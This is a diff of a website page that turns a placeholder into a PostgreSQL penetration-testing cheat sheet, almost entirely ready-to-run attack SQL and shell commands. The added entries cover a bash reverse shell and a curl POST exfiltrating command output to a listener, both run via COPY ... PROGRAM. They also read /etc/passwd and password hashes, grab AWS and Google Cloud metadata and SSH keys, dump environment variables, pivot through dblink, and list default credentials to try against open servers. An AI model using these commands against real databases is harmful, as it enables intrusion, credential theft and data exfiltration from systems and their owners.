@@ -1,26 +1,116 @@
 ---
-title: Postgresql
+title: PostgreSQL
 layout: default
 permalink: /postgresql/
 ---
 
-<div class="home">
+<div class="wrapper">
   <div class="page-heading">
-    <h2 class="page-title">Postgresql</h2>
+    <h1 class="page-title">&lt;postgresql&gt;</h1>
+    <p class="page-intro">Enumerating, priviliging and pivoting through PostgreSQL databases during a penetration test.</p>
   </div>
-  <div class="about">
-    <div class="container-face">
-      <img class="face" src="{{site.baseurl}}/assets/img/{% if site.pic %}{{ site.pic }}{% else %}github.jpg{% endif %}" alt="">
-    </div>
-    <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
-    <div class="about-description">
-      <p>Sometimes we have access to a Postgresql Server and here are some fun commands.</p>
-    </div>
-    <div class="contact-contaiver">
-      <ul class="contact-list">
-        <script src="https://gist.github.com/random-robbie/9c77661038e9d597bbd98db275e21c70.js"></script><br><br>
-       
-          </ul>
-    </div>
+
+  <div class="post-content" style="max-width: 860px;">
+    <h2>$ List all tables</h2>
+    <p>Enumerate every schema and table visible to the current role.</p>
+    <pre><code>SELECT table_schema,table_name
+FROM information_schema.tables
+ORDER BY table_schema,table_name;</code></pre>
+
+    <h2>$ LFI example — read local files</h2>
+    <p>If the database user has sufficient rights, files on the database server can be read into a table.</p>
+    <pre><code>CREATE TABLE myfile (input TEXT);
+COPY myfile FROM '/etc/passwd';
+SELECT input FROM myfile;</code></pre>
+
+    <h2>$ Display PostgreSQL users</h2>
+    <p>Password hashes for all roles live in <code>pg_shadow</code> and are readable by superusers only.</p>
+    <pre><code>SELECT usename, passwd FROM pg_shadow;</code></pre>
+
+    <h2>$ Show current user</h2>
+    <pre><code>select current_user;</code></pre>
+
+    <h2>$ Reverse shell via COPY TO PROGRAM</h2>
+    <p>Only superusers (or members of <code>pg_execute_server_program</code> on PostgreSQL 11+) may run arbitrary OS commands with <code>COPY ... FROM PROGRAM</code>. Replace <code>IP</code> with your listener address.</p>
+    <pre><code>CREATE TABLE weather_json (cities TEXT);
+COPY weather_json FROM PROGRAM 'bash -i >&amp; /dev/tcp/IP/4444 0>&amp;1';
+SELECT weather_json FROM weather_json;</code></pre>
+
+    <h2>$ Grab AWS metadata</h2>
+    <pre><code>CREATE TABLE weather_json (cities TEXT);
+COPY weather_json FROM PROGRAM 'curl -L http://169.254.169.254/latest/meta-data/';
+SELECT weather_json FROM weather_json;</code></pre>
+
+    <h2>$ Grab Google Cloud metadata</h2>
+    <pre><code>CREATE TABLE weather_json (cities TEXT);
+COPY weather_json FROM PROGRAM 'curl -L http://metadata.google.internal/computeMetadata/v/project/attributes/ssh-keys?alt=json -H "Metadata-Flavor: Google"';
+SELECT weather_json FROM weather_json;</code></pre>
+
+    <h2>$ Dump environment variables</h2>
+    <pre><code>CREATE TABLE weather_json (cities TEXT);
+COPY weather_json FROM PROGRAM 'printenv';
+SELECT weather_json FROM weather_json;</code></pre>
+
+    <h2>$ Read files with pg_read_file</h2>
+    <p>Superusers and members of <code>pg_read_server_files</code> can read arbitrary server files directly, no staging table required.</p>
+    <pre><code>SELECT pg_read_file('/etc/passwd');
+SELECT pg_read_file('/var/lib/postgresql/data/postgresql.conf');
+SELECT pg_ls_dir('/var/lib/postgresql/data');</code></pre>
+
+    <h2>$ Command execution without COPY</h2>
+    <p><code>pg_read_file</code>-style built-ins aside, <code>COPY ... TO PROGRAM</code> also executes commands, and output can be written to your listener instead of a table:</p>
+    <pre><code>COPY (SELECT '') TO PROGRAM 'id | curl -X POST --data-binary @- http://IP:8000';</code></pre>
+
+    <h2>$ Abuse dblink and extensions</h2>
+    <p>If <code>dblink</code> is installed, you can query other databases and hosts as the current user — useful for lateral movement and pivoting to internal database servers.</p>
+    <pre><code>CREATE EXTENSION IF NOT EXISTS dblink;
+SELECT * FROM dblink('host=10.0.0.5 dbname=postgres user=postgres password=postgres', 'SELECT version()') AS t(version TEXT);
+
+-- loop through all databases on the local instance
+SELECT datname FROM pg_database;</code></pre>
+
+    <h2>$ Search column names across tables</h2>
+    <p>Find where interesting data (passwords, tokens, cards) is stored without dumping every table.</p>
+    <pre><code>SELECT table_schema, table_name, column_name
+FROM information_schema.columns
+WHERE column_name ILIKE '%pass%'
+   OR column_name ILIKE '%token%'
+   OR column_name ILIKE '%secret%'
+   OR column_name ILIKE '%key%'
+ORDER BY table_schema, table_name;</code></pre>
+
+    <h2>$ Connecting with psql one-liners</h2>
+    <p>Quick connection strings for follow-up work; the same URL format works for most drivers.</p>
+    <pre><code>psql -h IP -U postgres -d postgres -W
+psql "postgresql://postgres:postgres@IP:5432/postgres"
+
+# run a single query non-interactively
+psql "postgresql://postgres:postgres@IP:5432/postgres" -c "SELECT current_user;"
+
+# copy a whole table out as CSV
+psql "postgresql://postgres:postgres@IP:5432/dbname" -c "\copy users TO 'users.csv' CSV HEADER"</code></pre>
+
+    <h2>$ Common default credentials</h2>
+    <p>Try these pairs first against open PostgreSQL services — many installs never change the defaults.</p>
+    <pre><code>postgres : postgres
+postgres : password
+postgres : admin
+postgres : 123456
+root     : postgres
+admin    : admin
+# no password (trust authentication in pg_hba.conf)
+postgres :</code></pre>
+
+    <h2>$ Check for a superuser and granted roles</h2>
+    <p>Confirm whether the compromised role can reach the <code>COPY ... PROGRAM</code> primitives above.</p>
+    <pre><code>SELECT rolname, rolsuper, rolcreaterole, rolcreatedb
+FROM pg_roles
+WHERE rolname = current_user;
+
+SELECT r.rolname AS granted_role
+FROM pg_authid a
+JOIN pg_auth_members m ON a.oid = m.member
+JOIN pg_authid r ON r.oid = m.roleid
+WHERE a.rolname = current_user;</code></pre>
   </div>
 </div>
